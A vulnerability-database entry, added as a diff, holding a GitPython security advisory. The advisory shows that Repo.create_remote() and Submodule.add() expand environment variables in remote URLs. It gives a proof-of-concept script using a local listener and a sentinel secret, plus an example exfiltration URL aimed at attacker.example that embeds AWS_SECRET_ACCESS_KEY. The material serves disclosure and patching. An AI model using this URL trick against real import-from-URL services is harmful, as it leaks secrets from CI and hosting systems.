@@ -1,0 +1,175 @@
+[basic]
+description = '''
+## Summary
+
+The fix for [GHSA-rwj8-pgh3-r573](https://github.com/gitpython-developers/GitPython/security/advisories/GHSA-rwj8-pgh3-r573) stopped `Repo.clone_from()` from running caller-supplied URLs through `os.path.expandvars()`, but it guarded only that one caller. `Remote.create()` — reached from the public `Repo.create_remote()` and its `Remote.add()` alias — still passes an attacker-influenceable URL through `Git.polish_url()` with the default `expand_vars=True`. A URL such as `http://attacker.example/${AWS_SECRET_ACCESS_KEY}/repo.git` is expanded server-side to embed the hosting process's environment secret, written into `.git/config`, and then transmitted to the attacker's host on the next `fetch`/`pull`. This is the same primitive and same \"import repository from URL\" threat model the advisory describes, via the sibling caller the fix missed.
+
+## Root Cause
+
+Fix commit [`8ac5a305`](https://github.com/gitpython-developers/GitPython/commit/8ac5a30519b6f4af85398b9b9d7064ff4d452da2) added an `expand_vars` parameter to `Git.polish_url()` (default `True`) and used `expand_vars=False` only in `Repo._clone()` ([`git/repo/base.py:1455`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/repo/base.py#L1455)). The shared helper's dangerous default was left in place, and the other callers were not updated.
+
+[`git/remote.py:811`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/remote.py#L811), `Remote.create`:
+
+```python
+url = Git.polish_url(url)                 # expand_vars=True -> os.path.expandvars(url)
+if not allow_unsafe_protocols:
+    Git.check_unsafe_protocols(url)       # https:// carrying the secret passes
+repo.git.remote(scmd, \"--\", name, url, **kwargs)   # expanded URL written to .git/config
+```
+
+`check_unsafe_protocols()` runs *after* expansion here, so it rejects an `ext::` payload but does nothing about an `https://` URL that carries an expanded secret in its path or host — the disclosure primitive.
+
+The same unguarded call also sits at [`git/objects/submodule/base.py:611`](https://github.com/gitpython-developers/GitPython/blob/3.1.53/git/objects/submodule/base.py#L611) (`Submodule.add`), which writes the expanded URL into `.gitmodules` (a tracked file) and `.git/config`.
+
+## Steps to Reproduce
+
+### Prerequisites
+
+- Python 3.9+
+- `git` on `PATH` (for the fetch step)
+- GitPython 3.1.53 (installed below)
+
+### Step 1: Install GitPython 3.1.53 in a clean venv
+
+```bash
+mkdir /tmp/gp-remote-poc && cd /tmp/gp-remote-poc
+python3 -m venv venv
+./venv/bin/pip install gitpython==3.1.53
+```
+
+### Step 2: Write the PoC
+
+```bash
+cat > poc.py <<'PYEOF'
+#!/usr/bin/env python3
+\"\"\"Env-var exfiltration via Repo.create_remote() URL. Sentinel data only.\"\"\"
+import http.server
+import os
+import tempfile
+import threading
+
+import git
+
+print(\"gitpython version:\", git.__version__)
+
+# Sentinel standing in for a process secret such as AWS_SECRET_ACCESS_KEY.
+SENTINEL = \"leaked-a1b2c3-SENTINEL-do-not-use\"
+os.environ[\"GP_SENTINEL_SECRET\"] = SENTINEL
+
+# Local HTTP server standing in for attacker.example.
+captured = []
+
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_GET(self):
+        captured.append(self.path)
+        self.send_response(404)
+        self.end_headers()
+
+    def log_message(self, *a):
+        pass
+
+
+srv = http.server.HTTPServer((\"127.0.0.1\", 0), Handler)
+port = srv.server_address[1]
+threading.Thread(target=srv.serve_forever, daemon=True).start()
+
+# Attacker-controlled URL handed to an \"import from URL\" feature.
+attacker_url = \"http://127.0.0.1:%d/steal/${GP_SENTINEL_SECRET}/repo.git\" % port
+
+
+def norm(s):  # display the ephemeral listener port as a stable placeholder
+    return s.replace(\"127.0.0.1:%d\" % port, \"127.0.0.1:PORT\")
+
+
+print(\"attacker-supplied URL :\", norm(attacker_url))
+
+repo = git.Repo.init(tempfile.mkdtemp(prefix=\"gp-victim-\"))
+remote = repo.create_remote(\"evil\", attacker_url)   # public API
+
+stored = repo.remote(\"evil\").url
+print(\"stored remote URL     :\", norm(stored))
+print(\"SENTINEL in git config:\", SENTINEL in stored)
+
+try:
+    remote.fetch()          # transmits the expanded URL to the attacker host
+except Exception:
+    pass                    # fetch fails after the request is already sent
+
+srv.shutdown()
+over_network = any(SENTINEL in p for p in captured)
+print(\"HTTP paths received   :\", [norm(p) for p in captured])
+print(\"SENTINEL over network :\", over_network)
+
+print()
+if SENTINEL in stored and over_network:
+    print(\"VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host\")
+elif SENTINEL in stored:
+    print(\"VULNERABLE: env-var expanded into stored git-config URL\")
+else:
+    print(\"not reproduced\")
+PYEOF
+```
+
+### Step 3: Run it
+
+```bash
+cd /tmp/gp-remote-poc && ./venv/bin/python poc.py
+```
+
+Expected output (the listener's ephemeral port is shown as `PORT`):
+
+```
+gitpython version: 3.1.53
+attacker-supplied URL : http://127.0.0.1:PORT/steal/${GP_SENTINEL_SECRET}/repo.git
+stored remote URL     : http://127.0.0.1:PORT/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git
+SENTINEL in git config: True
+HTTP paths received   : ['/steal/leaked-a1b2c3-SENTINEL-do-not-use/repo.git/info/refs?service=git-upload-pack']
+SENTINEL over network : True
+
+VULNERABLE: env-var expanded into stored URL AND transmitted to attacker host
+```
+
+The `${GP_SENTINEL_SECRET}` token in the supplied URL is replaced with the environment value both in the stored `.git/config` URL and in the request that reaches the attacker-controlled host.
+
+## Suggested Fix
+
+Pass `expand_vars=False` at the remaining URL callers, matching the clone fix:
+
+- `git/remote.py` `Remote.create`: `url = Git.polish_url(url, expand_vars=False)`
+- `git/objects/submodule/base.py` `Submodule.add`: `url = Git.polish_url(url, expand_vars=False)`
+
+More robustly, flip the `Git.polish_url()` default to `expand_vars=False` (env-var expansion on a URL is never desirable for network remotes) and require callers that genuinely normalize local paths to opt in.
+
+## Cleanup
+
+```bash
+rm -rf /tmp/gp-remote-poc
+```
+
+## Impact
+
+Any secret in the hosting process environment (`AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, CI/CD tokens) is disclosed to an attacker who controls a remote URL passed to `Repo.create_remote()` / `Remote.add()`. The secret is expanded into `.git/config` immediately and transmitted over the network (DNS + HTTP) on the next `fetch`/`pull`/`remote update`. This is the documented \"import repository from URL\" attacker model of GHSA-rwj8-pgh3-r573 — CI servers, git-hosting mirrors, and dependency scanners — applied to the add-a-remote flow, which the clone-only fix did not cover. The same disclosure reaches `.gitmodules` (a committable file) via `Submodule.add()`.
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "GitPython: Environment-variable exfiltration via Repo.create_remote() / Remote.add() URL (incomplete fix of GHSA-rwj8-pgh3-r573)"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-94p4-4cq8-9g67"]
+ave_id = "AVE-2026-1050"
+
+[meta]
+collected_at = "2026-08-05T23:26:29.382547702+00:00"
+status = "completed"
+
+[references]
+urls = []
